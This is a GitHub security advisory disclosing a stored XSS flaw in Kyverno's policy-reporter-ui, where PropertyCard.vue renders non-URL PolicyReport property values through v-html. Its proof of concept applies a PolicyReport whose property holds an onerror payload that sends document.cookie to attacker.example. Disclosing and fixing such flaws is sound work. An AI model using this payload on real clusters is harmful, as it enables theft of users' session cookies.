# [M] Kyverno policy-reporter-ui has XSS via Stored Property Values in PropertyCard Component

## Summary
Severity: Medium
Advisory: GHSA-q98m-7w8c-w388
CVE: CVE-2026-44245
CWE: CWE-79
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-q98m-7w8c-w388
Type: github-advisory

## Affected
- Go: `github.com/kyverno/policy-reporter-ui` — affected >=0 <2.5.2

## Details
### Summary
Vue 3's v-html directive is the framework-documented mechanism for injecting raw HTML, and it intentionally disables the auto-escaping that {{ }} interpolation provides. The PropertyCard.vue component uses v-html for the else branch of the URL check, meaning any non-URL string value flows directly into the DOM as HTML. The isURL() guard only filters values that parse as http: or https: URLs, so any HTML payload not starting with those schemes (e.g., `<img src=x onerror=alert(1)>` padded to exceed 75 chars) bypasses it entirely. The data originates from Kubernetes PolicyReport .results[].properties fields, which are arbitrary string maps populated by policy engines and potentially by any principal with write access to PolicyReport objects in the cluster. No DOMPurify or equivalent HTML sanitization library is present anywhere in the frontend codebase, confirming there is no compensating control between the API response and the sink.

This vulnerability was reproduced on the latest policy reporter UI version – 2.5.1.


### PoC

Prerequisites: Kubernetes write access to PolicyReport resources in the target cluster (e.g., via a policy engine service account or direct kubectl access)

Create a Kubernetes PolicyReport resource with a crafted property value longer than 75 characters. When an authenticated Policy Reporter UI user browses to the affected namespace and expands the result row containing this property, the injected script executes in their browser.
```bash
kubectl apply -f - <<'EOF'
apiVersion: [wgpolicyk8s.io/v1alpha2](http://wgpolicyk8s.io/v1alpha2)
kind: PolicyReport
metadata:
  name: xss-poc
  namespace: default
results:
- message: "test"
  policy: xss-test-policy
  rule: check-rule
  result: fail
  properties:
    # Value > 75 chars and not an http/https URL -> routed to v-html sink
    advisory: "<img src=x onerror=\"fetch('[https://attacker.example/c?c='+document.cookie](https://attacker.example/c?c=%27+document.cookie))\"> padding padding padding"
EOF
# Once a UI user opens the results table for the 'default' namespace
# and expands the 'xss-test-policy' result row, the onerror handler fires
# and exfiltrates their session cookies to attacker.example
```
<img width="1562" height="1061" alt="Снимок экрана — 2026-04-21 в 10 52 17" src="https://github.com/user-attachments/assets/fe542ccb-1662-44cb-802f-7998aa145db7" />
<img width="1041" height="939" alt="Снимок экрана — 2026-04-21 в 10 51 44" src="https://github.com/user-attachments/assets/bc07cf20-aea5-4a90-838f-c428d88a92b7" />

### Impact
XSS

## References
- https://github.com/kyverno/kyverno/security/advisories/GHSA-q98m-7w8c-w388
- https://nvd.nist.gov/vuln/detail/CVE-2026-44245
- https://github.com/kyverno/kyverno
